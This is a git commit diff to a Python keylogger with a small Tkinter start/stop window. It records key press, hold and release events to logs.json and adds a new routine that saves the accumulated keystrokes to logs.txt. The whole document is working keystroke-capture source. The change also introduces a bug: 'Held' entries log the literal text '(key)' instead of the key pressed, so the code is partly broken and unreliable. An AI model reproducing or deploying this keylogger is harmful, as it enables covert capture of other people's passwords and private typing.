6efbf94455c4bd5dfe07993a158fbf5263a448f9
pawankrr01 <83574965+pawankrr01@users.noreply.github.com>
2023-07-26 16:48:44 +0530

    Add files via upload

--- Keylogger/Keylogger.py
+++ Keylogger/Keylogger.py
@@ -17,26 +17,41 @@ key_list = []
 x = False
 key_strokes = ""
 
+def update_txt_file(key):
+   with open('logs.txt', 'w+') as key_strokes:
+       key_strokes.write(key)
+
 def update_json_file(key_list):
-    with open('logs.json', 'w') as key_log:
-        json.dump(key_list, key_log)
+    with open('logs.json', '+wb') as key_log:
+      key_list_bytes = json.dumps(key_list).encode()
+      key_log.write(key_list_bytes) 
+        
 
 def on_press(key):
     global x, key_list
-    if not x:
-        key_list.append({'Pressed': f'{key}'})
-    x = True
-    if x:
-        key_list.append({'Held': f'{key}'})
+    if x == False:
+        key_list.append(
+            {'Pressed': f'{key}'}
+        )
+        x = True
+    if x == True:
+        key_list.append(
+            {'Held': f'(key)'}
+        )
     update_json_file(key_list)
 
 def on_release(key):
     global x, key_list, key_strokes
-    key_list.append({'Released': f'{key}'})
-    if x:
+    key_list.append(
+       {'Released': f'{key}'}
+     )
+    if x == True:
         x = False
     update_json_file(key_list)
 
+    key_strokes=key_strokes+str(key)
+    update_txt_file(str(key_strokes))
+    
 def start_keylogger():
     print("[+] Keylogger started successfully!")
     print("[!] Saving the key logs in 'logs.json'")
@@ -51,13 +66,13 @@ def close_interface():
     root.destroy()
 
 
-label = Label(root, text="Click Start to begin keylogging.")
+label = Label(root, text="Click Start to begin keylogging.", bg="white", fg="black", font='Sans-serif' )
 label.place(relx=0.5, rely=0.3, anchor=CENTER)
 
-start_button = Button(root, text="Start", command=start_keylogger)
+start_button = Button(root, text="Start", command=start_keylogger,bg="darkgreen", fg="white", font='Verdana 12' )
 start_button.place(relx=0.5, rely=0.5, anchor=CENTER)
 
-stop_button = Button(root, text="Stop", command=close_interface, state='normal')
+stop_button = Button(root, text="Stop", command=close_interface, state='normal', bg="red", fg="white", font='Verdana 12' )
 stop_button.place(relx=0.5, rely=0.7, anchor=CENTER)
 
 root.mainloop()
